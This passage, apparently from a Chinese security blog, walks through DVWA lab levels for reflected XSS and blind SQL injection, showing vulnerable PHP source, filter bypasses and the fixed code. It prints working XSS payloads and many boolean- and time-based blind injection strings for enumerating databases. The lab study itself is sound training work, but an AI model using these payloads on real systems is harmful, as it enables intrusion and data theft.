<h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p>服务器端核心代码</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/XSS_R/33.PNG" alt="">!</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">&#x2F;&#x2F; Is there any input? </span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] !&#x3D; NULL ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line">    $name &#x3D; str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] ); </span><br><span class="line">    &#x2F;&#x2F; Feedback for end user </span><br><span class="line">    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;&#x2F;pre&gt;&quot;; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到，这里对输入进行了过滤，基于黑名单的思想，使用str_replace函数将输入中的<script>删除，这种防护机制是可以被轻松绕过的。</p>
<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>1.双写绕过</p>
<p>输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;ript&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>成功弹框，如下图所示：</p>
<p><img src="Ehttps://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/XSS_R/34.PNG" alt=""></p>
<p>2.大小写混淆绕过</p>
<p>输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ScRipt&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>成功弹框，如下图所示：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/XSS_R/35.PNG" alt=""></p>
<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>服务器端核心代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">&#x2F;&#x2F; Is there any input? </span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] !&#x3D; NULL ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line">    $name &#x3D; preg_replace( &#39;&#x2F;&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t&#x2F;i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] ); </span><br><span class="line">    &#x2F;&#x2F; Feedback for end user </span><br><span class="line">    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;&#x2F;pre&gt;&quot;; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到，High级别的代码同样使用黑名单过滤输入，preg_replace() 函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效。</p>
<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>虽然无法使用<script>标签注入XSS代码，但是可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码。</p>
<p>输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;1 onerror&#x3D;alert(&#x2F;xss&#x2F;)&gt;</span><br></pre></td></tr></table></figure>

<p>成功弹框，如下图所示：</p>
<p><img src="Ehttps://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/XSS_R/36.PNG" alt=""></p>
<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p>服务器端核心代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">&#x2F;&#x2F; Is there any input? </span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] !&#x3D; NULL ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Check Anti-CSRF token </span><br><span class="line">    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); </span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line">    $name &#x3D; htmlspecialchars( $_GET[ &#39;name&#39; ] ); </span><br><span class="line">    &#x2F;&#x2F; Feedback for end user </span><br><span class="line">    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;&#x2F;pre&gt;&quot;; </span><br><span class="line">&#125; </span><br><span class="line">&#x2F;&#x2F; Generate Anti-CSRF token </span><br><span class="line">generateSessionToken(); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到，Impossible级别的代码使用htmlspecialchars函数把预定义的字符&、”、 ’、<、>转换为 HTML 实体，防止浏览器将其作为HTML元素。</p>

      
      <!-- 打赏 -->
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/09/XSS_R/" data-id="ck56chf990002fcvof8kh5lrj"
        class="article-share-link">分享</a>
      
    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-SQL Injection(Blind)" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/01/09/SQL%20Injection(Blind)/"
    >SQL Injection(Blind)</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/01/09/SQL%20Injection(Blind)/" class="article-date">
  <time datetime="2020-01-09T06:14:53.276Z" itemprop="datePublished">2020-01-09</time>
</a>
      
    </div>
    

    

    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h1 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection(Blind)"></a>SQL Injection(Blind)</h1><p>SQL Injection（Blind），即SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。</p>
<h2 id="手工盲注思路"><a href="#手工盲注思路" class="headerlink" title="手工盲注思路"></a>手工盲注思路</h2><p>手工盲注的过程，就像你与一个机器人聊天，这个机器人知道的很多，但只会回答“是”或者“不是”，因此你需要询问它这样的问题，例如“数据库名字的第一个字母是不是a啊？”，通过这种机械的询问，最终获得你想要的数据。</p>
<p>盲注分为基于布尔的盲注、基于时间的盲注以及基于报错的盲注，这里由于实验环境的限制，只演示基于布尔的盲注与基于时间的盲注。</p>
<p>下面简要介绍手工盲注的步骤（可与之前的<a href="http://www.freebuf.com/articles/web/120747.html" target="_blank" rel="noopener">手工注入</a>作比较）：</p>
<p>1.判断是否存在注入，注入是字符型还是数字型</p>
<p>2.猜解当前数据库名</p>
<p>3.猜解数据库中的表名</p>
<p>4.猜解表中的字段名</p>
<p>5.猜解数据</p>
<p>下面对四种级别的代码进行分析。</p>
<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>服务器端核心代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#39;Submit&#39; ] ) ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line">    $id &#x3D; $_GET[ &#39;id&#39; ]; </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check database </span><br><span class="line">    $getid  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; &#39;$id&#39;;&quot;; </span><br><span class="line">    $result &#x3D; mysql_query( $getid ); &#x2F;&#x2F; Removed &#39;or die&#39; to suppress mysql errors </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get results </span><br><span class="line">    $num &#x3D; @mysql_numrows( $result ); &#x2F;&#x2F; The &#39;@&#39; character suppresses errors </span><br><span class="line">    if( $num &gt; 0 ) &#123; </span><br><span class="line">        &#x2F;&#x2F; Feedback for end user </span><br><span class="line">        echo &#39;&lt;pre&gt;User ID exists in the database.&lt;&#x2F;pre&gt;&#39;; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        &#x2F;&#x2F; User wasn&#39;t found, so the page wasn&#39;t! </span><br><span class="line">        header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; ); </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Feedback for end user </span><br><span class="line">        echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;&#x2F;pre&gt;&#39;; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到，Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种，‘</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User ID exists in the database.</span><br></pre></td></tr></table></figure>

<p>‘与‘</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;User ID is MISSING from the database.&#96;</span><br></pre></td></tr></table></figure>

<p>‘，因此这里是SQL盲注漏洞。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>首先演示<strong>基于布尔的盲注</strong>：</p>
<h3 id="1-判断是否存在注入，注入是字符型还是数字型"><a href="#1-判断是否存在注入，注入是字符型还是数字型" class="headerlink" title="1.判断是否存在注入，注入是字符型还是数字型"></a>1.判断是否存在注入，注入是字符型还是数字型</h3><p>输入1，显示相应用户存在如下图所示：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL_Blind/23.PNG" alt=""></p>
<p>输入1’ and 1=1 #，显示存在，如下图所示：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL_Blind/24.PNG" alt=""></p>
<p>输入1’ and 1=2 #，显示不存在，如下图所示：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL_Blind/25.PNG" alt=""></p>
<p>说明存在字符型的SQL盲注。</p>
<h3 id="2-猜解当前数据库名"><a href="#2-猜解当前数据库名" class="headerlink" title="2.猜解当前数据库名"></a>2.猜解当前数据库名</h3><p>想要猜解数据库名，首先要猜解数据库名的长度，然后挨个猜解字符。</p>
<p>输入1’ and length(database())=1 #，显示不存在；</p>
<p>输入1’ and length(database())=2 #，显示不存在；</p>
<p>输入1’ and length(database())=3 #，显示不存在；</p>
<p>输入1’ and length(database())=4 #，显示存在，如下图所示：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL_Blind/26.PNG" alt=""></p>
<p>说明数据库名长度为4。</p>
<p>下面采用二分法猜解数据库名。</p>
<p>输入1’ and ascii(substr(database(),1,1))&gt;97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；</p>
<p>输入1’ and ascii(substr(database(),1,1))&lt;122 #，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；</p>
<p>输入1’ and ascii(substr(database(),1,1))&lt;109 #，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；</p>
<p>输入1’ and ascii(substr(database(),1,1))&lt;103 #，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；</p>
<p>输入1’ and ascii(substr(database(),1,1))=100 #，显示存在，说明数据库名的第一个字符的ascii值等于100（小写字母d的ascii值），即小写字母d，如下图所示：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL_Blind/27.PNG" alt=""></p>
<p>重复上述步骤，就可以猜解出完整的数据库名（dvwa）了。</p>
<h3 id="3-猜解数据库中的表名"><a href="#3-猜解数据库中的表名" class="headerlink" title="3.猜解数据库中的表名"></a>3.猜解数据库中的表名</h3><p>首先猜解数据库中表的数量：</p>
<p>1’ and (select count(table_name) from information_schema.tables where table_schema=’dvwa’)=1 # 显示不存在</p>
<p>1’ and (select count(table_name) from information_schema.tables where table_schema=’dvwa’)=2 # 显示存在,如下图所示：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL_Blind/28.PNG" alt=""></p>
<p>说明数据库中共有两个表。</p>
<p>接着挨个猜解表名：</p>
<p>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 # 显示不存在</p>
<p>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2 # 显示不存在</p>
<p>…</p>
<p>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # 显示存在,如下图所示：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL_Blind/29.PNG" alt=""></p>
<p>说明第一个表名长度为9。</p>
<p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97 # 显示存在</p>
<p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122 # 显示存在</p>
<p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;109 # 显示存在</p>
<p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103 # 显示存在，如下图所示:</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL_Blind/30.PNG" alt=""></p>
<p>说明第一个表的名字的第一个字符为小写字母g。</p>
<p>…</p>
<p>重复上述步骤，即可猜解出两个表名（guestbook、users）。</p>
<h3 id="4-猜解表中的字段名"><a href="#4-猜解表中的字段名" class="headerlink" title="4.猜解表中的字段名"></a>4.猜解表中的字段名</h3><p>首先猜解表中字段的数量：</p>
<p>1’ and (select count(column_name) from information_schema.columns where table_name= ‘users’)=1 # 显示不存在</p>
<p>…</p>
<p>1’ and (select count(column_name)from information_schema.columns where table_name=’users’)=8 # 显示存在</p>
<p>说明users表有8个字段。</p>
<p>接着挨个猜解字段名：</p>
<p>1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1 # 显示不存在</p>
<p>…</p>
<p>1’ and length(substr((select column_name from information_schema.columns where table_name= ‘users’ limit 0,1),1))=7 # 显示存在</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL_Blind/31.PNG" alt=""></p>
<p>说明users表的第一个字段为7个字符长度。</p>
<h3 id="5-猜解数据"><a href="#5-猜解数据" class="headerlink" title="5.猜解数据"></a>5.猜解数据</h3><p>同样采用二分法。</p>
<p>还可以使用<strong>基于时间的盲注</strong>：</p>
<h3 id="1-判断是否存在注入，注入是字符型还是数字型-1"><a href="#1-判断是否存在注入，注入是字符型还是数字型-1" class="headerlink" title="1.判断是否存在注入，注入是字符型还是数字型"></a>1.判断是否存在注入，注入是字符型还是数字型</h3><p>输入1’ and sleep(5) #，感觉到明显延迟；</p>
<p>输入1 and sleep(5) #，没有延迟；</p>
<p>说明存在字符型的基于时间的盲注。</p>
<h3 id="2-猜解当前数据库名-1"><a href="#2-猜解当前数据库名-1" class="headerlink" title="2.猜解当前数据库名"></a>2.猜解当前数据库名</h3><p>首先猜解数据名的长度：</p>
<p>1’ and if(length(database())=1,sleep(5),1) # 没有延迟</p>
<p>1’ and if(length(database())=2,sleep(5),1) # 没有延迟</p>
<p>1’ and if(length(database())=3,sleep(5),1) # 没有延迟</p>
<p>1’ and if(length(database())=4,sleep(5),1) # 明显延迟</p>
<p>说明数据库名长度为4个字符。</p>
<p>接着采用二分法猜解数据库名：</p>
<p>1’ and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)# 明显延迟</p>
<p>…</p>
<p>1’ and if(ascii(substr(database(),1,1))&lt;100,sleep(5),1)# 没有延迟</p>
<p>1’ and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)# 没有延迟</p>
<p>说明数据库名的第一个字符为小写字母d。</p>
<p>…</p>
<p>重复上述步骤，即可猜解出数据库名。</p>
<h3 id="3-猜解数据库中的表名-1"><a href="#3-猜解数据库中的表名-1" class="headerlink" title="3.猜解数据库中的表名"></a>3.猜解数据库中的表名</h3><p>首先猜解数据库中表的数量：</p>
<p>1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)# 没有延迟</p>
<p>1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)# 明显延迟</p>
<p>说明数据库中有两个表。</p>
<p>接着挨个猜解表名：</p>
<p>1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1) # 没有延迟</p>
<p>…</p>
<p>1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) # 明显延迟</p>
<p>说明第一个表名的长度为9个字符。</p>
<p>采用二分法即可猜解出表名。</p>
<h3 id="4-猜解表中的字段名-1"><a href="#4-猜解表中的字段名-1" class="headerlink" title="4.猜解表中的字段名"></a>4.猜解表中的字段名</h3><p>首先猜解表中字段的数量：</p>
<p>1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=1,sleep(5),1)# 没有延迟</p>
<p>…</p>
<p>1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=8,sleep(5),1)# 明显延迟</p>
<p>说明users表中有8个字段。</p>
<p>接着挨个猜解字段名：</p>
<p>1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1,sleep(5),1) # 没有延迟</p>
<p>…</p>
<p>1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7,sleep(5),1) # 明显延迟</p>
<p>说明users表的第一个字段长度为7个字符。</p>
<p>采用二分法即可猜解出各个字段名。</p>
<h3 id="5-猜解数据-1"><a href="#5-猜解数据-1" class="headerlink" title="5.猜解数据"></a>5.猜解数据</h3><p>同样采用二分法。</p>
<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>服务器端核心代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line">    $id &#x3D; $_POST[ &#39;id&#39; ]; </span><br><span class="line">    $id &#x3D; mysql_real_escape_string( $id ); </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check database </span><br><span class="line">    $getid  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; $id;&quot;; </span><br><span class="line">    $result &#x3D; mysql_query( $getid ); &#x2F;&#x2F; Removed &#39;or die&#39; to suppress mysql errors </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get results </span><br><span class="line">    $num &#x3D; @mysql_numrows( $result ); &#x2F;&#x2F; The &#39;@&#39; character suppresses errors </span><br><span class="line">    if( $num &gt; 0 ) &#123; </span><br><span class="line">        &#x2F;&#x2F; Feedback for end user </span><br><span class="line">        echo &#39;&lt;pre&gt;User ID exists in the database.&lt;&#x2F;pre&gt;&#39;; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        &#x2F;&#x2F; Feedback for end user </span><br><span class="line">        echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;&#x2F;pre&gt;&#39;; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到，Medium级别的代码利用mysql_real_escape_string函数对特殊符号</p>
<p>\x00,\n,\r,,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。</p>
<p>如下图所示：</p>
<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL_Blind/32.PNG" alt=""></p>
<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数id，提交恶意构造的查询参数。</p>
<p>之前已经介绍了详细的盲注流程，这里就简要演示几个。</p>
<p>首先是<strong>基于布尔的盲注</strong>：</p>
<p>抓包改参数id为1 and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；</p>
<p>抓包改参数id为1 and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；</p>
<p>抓包改参数id为1 and (select count(column_name) from information_schema.columns where table_name= 0×7573657273)=8 #，（0×7573657273为users的16进制），显示存在，说明uers表有8个字段。</p>
<p>然后是<strong>基于时间的盲注</strong>：</p>
<p>抓包改参数id为1 and if(length(database())=4,sleep(5),1) #，明显延迟，说明数据库名的长度为4个字符；</p>
<p>抓包改参数id为1 and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) #，明显延迟，说明数据中的第一个表名长度为9个字符；</p>
<p>抓包改参数id为1 and if((select count(column_name) from information_schema.columns where table_name=0×7573657273 )=8,sleep(5),1) #，明显延迟，说明uers表有8个字段。</p>
<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>服务器端核心代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_COOKIE[ &#39;id&#39; ] ) ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line">    $id &#x3D; $_COOKIE[ &#39;id&#39; ]; </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check database </span><br><span class="line">    $getid  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; &#39;$id&#39; LIMIT 1;&quot;; </span><br><span class="line">    $result &#x3D; mysql_query( $getid ); &#x2F;&#x2F; Removed &#39;or die&#39; to suppress mysql errors </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get results </span><br><span class="line">    $num &#x3D; @mysql_numrows( $result ); &#x2F;&#x2F; The &#39;@&#39; character suppresses errors </span><br><span class="line">    if( $num &gt; 0 ) &#123; </span><br><span class="line">        &#x2F;&#x2F; Feedback for end user </span><br><span class="line">        echo &#39;&lt;pre&gt;User ID exists in the database.&lt;&#x2F;pre&gt;&#39;; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        &#x2F;&#x2F; Might sleep a random amount </span><br><span class="line">        if( rand( 0, 5 ) &#x3D;&#x3D; 3 ) &#123; </span><br><span class="line">            sleep( rand( 2, 4 ) ); </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; User wasn&#39;t found, so the page wasn&#39;t! </span><br><span class="line">        header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; ); </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Feedback for end user </span><br><span class="line">        echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;&#x2F;pre&gt;&#39;; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到，High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。</p>
<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，这里我们只演示<strong>基于布尔的盲注</strong>：</p>
<p>抓包将cookie中参数id改为1’ and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；</p>
<p>抓包将cookie中参数id改为1’ and length(substr(( select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；</p>
<p>抓包将cookie中参数id改为1’ and (select count(column_name) from information_schema.columns where table_name=0×7573657273)=8 #，（0×7573657273 为users的16进制），显示存在，说明uers表有8个字段。</p>
<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p>服务器端核心代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#39;Submit&#39; ] ) ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Check Anti-CSRF token </span><br><span class="line">    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line">    $id &#x3D; $_GET[ &#39;id&#39; ]; </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Was a number entered? </span><br><span class="line">    if(is_numeric( $id )) &#123; </span><br><span class="line">        &#x2F;&#x2F; Check the database </span><br><span class="line">        $data &#x3D; $db-&gt;prepare( &#39;SELECT first_name, last_name FROM users WHERE user_id &#x3D; (:id) LIMIT 1;&#39; ); </span><br><span class="line">        $data-&gt;bindParam( &#39;:id&#39;, $id, PDO::PARAM_INT ); </span><br><span class="line">        $data-&gt;execute(); </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Get results </span><br><span class="line">        if( $data-&gt;rowCount() &#x3D;&#x3D; 1 ) &#123; </span><br><span 